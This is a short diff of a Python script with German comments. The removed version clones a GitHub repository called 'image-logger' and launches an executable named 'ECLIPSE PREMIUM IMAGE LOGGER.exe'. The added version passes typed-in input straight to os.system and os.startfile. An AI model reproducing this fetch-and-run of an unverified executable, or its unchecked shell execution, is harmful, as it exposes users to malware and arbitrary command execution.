@@ -1,20 +1,22 @@
 import os
-import subprocess
 
-# Git-Repository klonen
-repo_url = "https://github.com/PsxDupingg/image-logger.git"
-repo_folder = "image-loggerr"
+def run_custom_command(command):
+    os.system(command)
 
-if not os.path.exists(repo_folder):
-    os.system(f"git clone {repo_url}")
+def open_folder(folder_path):
+    os.startfile(folder_path)
 
-# In den Repository-Ordner wechseln
-os.chdir(repo_folder)
+def execute_exe(file_path):
+    os.startfile(file_path)
 
-# Ausführbare Datei starten
-exe_file = "ECLIPSE PREMIUM IMAGE LOGGER.exe"
+# Benutzerdefinierter Befehl ausführen
+custom_command = input("git clone https://github.com/PsxDupingg/image-logger: ")
+run_custom_command(custom_command)
 
-if os.path.exists(exe_file):
-    subprocess.run(exe_file, shell=True)
-else:
-    print(f"Fehler: Die Datei '{exe_file}' wurde nicht gefunden.")
+# Ordner öffnen
+folder_path = input("image-logger: ")
+open_folder(folder_path)
+
+# .exe-Datei ausführen
+exe_file_path = input("ECLIPSE PREMIUM IMAGE LOGGER.exe: ")
+execute_exe(exe_file_path)
